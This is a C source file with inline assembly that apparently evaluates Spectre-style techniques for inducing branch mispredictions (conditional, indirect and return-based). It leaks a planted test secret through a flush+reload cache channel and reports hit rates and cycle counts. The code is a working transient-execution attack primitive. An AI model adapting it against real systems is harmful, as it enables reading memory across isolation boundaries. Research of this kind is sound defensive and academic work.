// evaluate techniques for inducing incorrect branch predictions

#include "common.h"

#include <cpuid.h>
#include <stdint.h>
#include <string.h>
#include <sys/user.h>
#include <unistd.h>

// number of branches executed during training
#define TRAIN_COUNT 0x1000

// spec_access always follows the same pattern:
//   if *trigger is trigger_attack, do nothing
//   else, access probe_arr[*target]
// during training: *trigger is trigger_train,
// during the attack: *trigger is trigger_attack,
//   but the branch predictor will still predict that the else clause is executed
//   thus, probe_array will be accessed during transient execution

// -------------------------------- conditional branch --------------------------------
#if defined(MODE_COND)

// trigger is a simple bool indicating if the branch should be taken or not
typedef bool trigger_t;

NAKED static void spec_access(UNUSED const volatile uintptr_t *target,
        UNUSED const page_t *probe_arr,
        UNUSED const volatile trigger_t *trigger) {
    asm(
            // if (*trigger) goto doit; else return;
            "mov (%rdx), %dl;"
            "test %dl, %dl;"
            "jnz doit;"
            "ret;"
            "doit:"
            // rax = (uint8_t)*(uintptr_t *)target
            "mov (%rdi), %rax;"
            "movzbl %al, %eax;"
            // access probe_arr[rax]
            "shl $12, %rax;"
            "mov (%rsi, %rax), %rax;"
            "ret;");
}

static const trigger_t trigger_train = true;
static const trigger_t trigger_attack = false;

// -------------------------------- indirect branch --------------------------------
#elif defined(MODE_IND)

// trigger is a pointer to a function pointer, the function is the target of the branch
typedef void (*next_func_t)(const volatile uintptr_t *, const page_t *);
typedef const next_func_t *trigger_t;

NAKED static void spec_access(UNUSED const volatile uintptr_t *target,
        UNUSED const page_t *probe_arr,
        UNUSED const volatile trigger_t *trigger) {
    // jump to **trigger
    asm("mov (%rdx), %rax;"
        "jmp *(%rax);");
}

NAKED static void spec_access_attack(UNUSED const volatile uintptr_t *target,
        UNUSED const page_t *probe_arr) {
    asm("ret");
}

NAKED static void spec_access_train(UNUSED const volatile uintptr_t *target,
        UNUSED const page_t *probe_arr) {
    asm(
            // rax = (uint8_t)*(uintptr_t *)target
            "mov (%rdi), %rax;"
            "movzbl %al, %eax;"
            // access probe_arr[rax]
            "shl $12, %rax;"
            "mov (%rsi, %rax), %rax;"
            "ret;");
}

static const next_func_t addr_attack = spec_access_attack;
static const next_func_t addr_train = spec_access_train;

static const trigger_t trigger_train = &addr_attack;
static const trigger_t trigger_attack = &addr_train;

// -------------------------------- return from function --------------------------------
#elif defined(MODE_RET)

#define NO_TRAINING

// dummy trigger, never used because we defined NO_TRAINING
typedef uint8_t trigger_t;

NAKED static void spec_access(UNUSED const volatile uintptr_t *target,
        UNUSED const page_t *probe_arr,
        UNUSED const volatile trigger_t *trigger) {
    asm("call setret;"
        "attack:"
        // rax = (uint8_t)*(uintptr_t *)target
        "mov (%rdi), %rax;"
        "movzbl %al, %eax;"
        // access probe_arr[rax]
        "shl $12, %rax;"
        "mov (%rsi, %rax), %rax;"
        "setret:"
        // rax = &doret
        "lea doret(%rip), %rax;"
        // execute some instructions depending on rax
        // to introduce data dependencies
        ".rept 16;"
        "imul $1, %rax, %rax;"
        ".endr;"
        // overwrite return address and return
        // return to attack will be predicted
        // real return is to doret
        "mov %rax, (%rsp);"
        "ret;"
        "doret: ret;");
}

static const trigger_t trigger_attack = 0;

#else
#error "Invalid mode"
#endif

// ----------------------------------------------------------------

void attacker(void) {
    // prepare cache-based transmission channel
    transmit_t transmit;
    transmit_prepare(&transmit);

    cyclecount_t cycles_train = 0;
    cyclecount_t cycles_attack = 0;

    // allocate page where we will place the trigger
    // it has to be on a cacheline on its own, so we can flush it without affecting other objects
    volatile trigger_t *trigger = (volatile void *)mmap_pages(1);

    volatile uintptr_t *target = (volatile void *)mmap_pages(1);
    *target = SECRET;

    for (size_t i = 0; i < SAMPLE_COUNT; i++) {

        // training
#ifndef NO_TRAINING
        // disable trigger
        *trigger = trigger_train;
        mem_access(target);
        // measure time needed for training
        cyclecount_t train_start = cyclecount();
        // perform training: execute spec_access with disabled trigger
        for (size_t j = 0; j < TRAIN_COUNT; j++) {
            spec_access(target, transmit.probe_arr + 0x80, trigger);
        }
        cyclecount_t train_end = cyclecount();
        cycles_train += train_end - train_start;
#endif

        // attack
        // enable trigger
        *trigger = trigger_attack;
        mem_access(target);
        // flush trigger to force branch predictor to predict
        mem_flush(trigger);
        // measure time needed for attack
        cyclecount_t attack_start = cyclecount();
        // perform attack: execute spec_access with enabled trigger
        spec_access(target, transmit.probe_arr, trigger);
        cyclecount_t attack_end = cyclecount();
        cycles_attack += attack_end - attack_start;

        // use flush+reload to decode any transmitted values
        transmit_receive(&transmit);
    }

    // print hit rate, cycles for training, cycles for attack
    printf("%lg,%lg,%lg\n",
            (double)transmit.hits[(uint8_t)SECRET] / SAMPLE_COUNT,
            (double)cycles_train / TRAIN_COUNT / SAMPLE_COUNT,
            (double)cycles_attack / SAMPLE_COUNT);
}
